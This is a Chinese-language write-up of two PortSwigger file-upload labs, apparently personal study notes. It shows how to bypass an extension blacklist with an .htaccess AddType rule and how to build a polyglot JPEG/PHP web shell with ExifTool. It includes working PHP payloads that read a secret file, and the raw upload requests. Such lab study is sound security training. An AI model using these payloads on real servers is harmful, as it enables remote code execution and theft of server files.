## 危险文件类型的黑名单不足

### 覆盖服务器配置
实验：通过扩展黑名单绕过 Web shell 上传
https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass

上传头像请求
POST /my-account/avatar HTTP/2

------geckoformboundarydc4c9e9ce3847482dd52573362b89ca3
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
上传头像响应
Server: Apache/2.4.41 (Ubuntu)

Sorry, php files are not allowed

Apache 服务器将从名为 .htaccess 的文件加载特定于目录的配置（如果存在）
在.htaccess 文件中使用AddType指令可以将文件扩展名映射到任意指定的内容类型
AddType media-type extension[extension]...

创建配置文件 .htaccess
内容为：
AddType application/x-httpd-php .jpg 

修改test.php文件的扩展名为jpg

上传两个文件后 回到账号页面时，对头像的请求将作为php脚本执行

示例解决方案中：
> 将 Content-Type 标头的值更改为 text/plain。
似乎更为恰当

## 文件内容验证有缺陷
实验：通过多语言 Web shell 上传远程执行代码
https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

上传php文件作为头像
POST /my-account/avatar HTTP/2

------geckoformboundary339439acd32682ca2b68d9eb6679eb96
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: application/octet-stream

<?php echo file_get_contents('/home/carlos/secret'); ?>
响应为
Error: file is not a valid image

下载并使用主题文章中的 ExifTool 工具，修改 exiftool(-k).exe 为 exiftool.exe
准备一个jpg文件，放入工具的exiftool.exe目录下
使用以下命令修改JPEG文件的注释字段注入PHP载荷
./exiftool -Comment='<?php echo file_get_contents('/home/carlos/secret'); ?>' test.jpg
或将代码保存在txt文件中，使用 ./exiftool -Comment<='test.txt' test.jpg 将文件内容导入

上传头像
Content-Disposition: form-data; name="avatar"; filename="test.php"
Content-Type: image/jpeg
响应为
The file avatars/test.php has been uploaded.

观察文件内容的头部的乱码与php代码

返回账号页面请求头像
GET /files/avatars/test.php HTTP/2
使用之前观察到的乱码范围，从响应中的部分乱码中提取php代码执行结果

示例解决方案：在代码中加入开头与结尾字符串以快速分辨php执行结果
> exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
> 将 PHP 有效负载添加到图像的注释字段，然后使用 .php 扩展名保存图像。
